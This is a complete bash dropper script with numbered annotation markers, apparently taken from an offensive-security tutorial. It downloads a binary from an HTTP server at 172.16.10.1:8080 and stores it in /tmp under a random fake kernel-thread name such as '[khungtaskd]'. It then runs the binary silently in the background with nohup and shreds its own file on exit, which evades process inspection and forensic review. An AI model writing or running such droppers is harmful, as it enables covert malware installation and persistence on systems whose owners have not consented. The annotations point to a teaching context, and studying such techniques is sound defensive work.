#!/bin/bash

WORK_DIR="/tmp"  # Temporary directory to store the binary

# ❶ List of fake process names designed to mimic system processes
RANDOM_BIN_NAMES=("[cpuhp/0]" "[khungtaskd]" "[blkcg_punt_biio]"
"[ipv8_addrconf]" "[mlb]" "[kstrrp]" "[neetns]" "[rcu_gb]")

# ❷ Generate a random number between 0 and 7 to select a name from the array
RANDOMIZE=$((RANDOM % 7))

# ❸ Use the selected process name and prepare the binary path
BIN_FILE="${RANDOM_BIN_NAMES[${RANDOMIZE}]}"
FULL_BIN_PATH="${WORK_DIR}/${BIN_FILE}"

# Function to self-delete the script upon exit
self_removal() {
  shred -u -- "$(basename "$0")" && rm -f -- "${FULL_BIN_PATH}"
}

# ❹ Check if 'curl' is installed
if command -v curl 1> /dev/null; then
  # ❺ Download the 'system_sleep' binary from an HTTP server
  curl -s "http://172.16.10.1:8080/system_sleep" -o "${FULL_BIN_PATH}"
  
  # Check if the file was downloaded and is non-empty
  if [[ -s "${FULL_BIN_PATH}" ]]; then
    # Make the binary executable
    chmod +x "${FULL_BIN_PATH}"
    
    # ❻ Add the working directory to the PATH
    export PATH="${WORK_DIR}:${PATH}"
    
    # ❼ Run the binary in the background, suppressing output
    nohup "${BIN_FILE}" &> /dev/null &
  fi
fi

# ❽ Ensure the script removes itself when it exits
trap self_removal EXIT
